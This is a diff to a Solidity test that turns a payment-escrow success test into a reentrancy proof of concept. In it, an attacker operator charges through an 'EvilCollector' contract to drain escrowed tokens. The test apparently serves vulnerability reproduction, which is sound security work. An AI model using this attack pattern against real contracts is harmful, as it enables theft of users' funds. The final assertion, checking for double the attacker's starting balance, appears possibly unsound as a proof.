@@ -14,14 +14,12 @@ contract ReentrancyRepro is PaymentEscrowBase {
         evilCollector = new EvilCollector(address(paymentEscrow));
     }
 
-    function test_succeeds_whenValueEqualsAuthorized() public {
+    function test_reentrancy() public {
         uint120 amount = 1000000000000000000;
+        mockERC3009Token.mint(address(paymentEscrow), amount);
         mockERC3009Token.mint(address(evilCollector), amount);
-        mockERC3009Token.mint(payerEOA, amount);
         uint256 attackerPrivateKey = 0x123;
         address attacker = vm.addr(attackerPrivateKey);
-
-        uint256 payerBalance = mockERC3009Token.balanceOf(payerEOA);
 
         PaymentEscrow.PaymentInfo memory paymentInfo = PaymentEscrow.PaymentInfo({
             operator: attacker,
@@ -43,11 +41,11 @@ contract ReentrancyRepro is PaymentEscrowBase {
 
         uint256 attackerBalanceBefore = mockERC3009Token.balanceOf(attacker);
 
-        vm.prank(operator);
+        vm.prank(attacker);
         paymentEscrow.charge(
             paymentInfo, amount, address(evilCollector), signature, paymentInfo.minFeeBps, paymentInfo.feeReceiver
         );
 
-        assertEq(mockERC3009Token.balanceOf(attacker), attackerBalanceBefore + amount);
+        assertEq(mockERC3009Token.balanceOf(attacker), attackerBalanceBefore * 2);
     }
 }
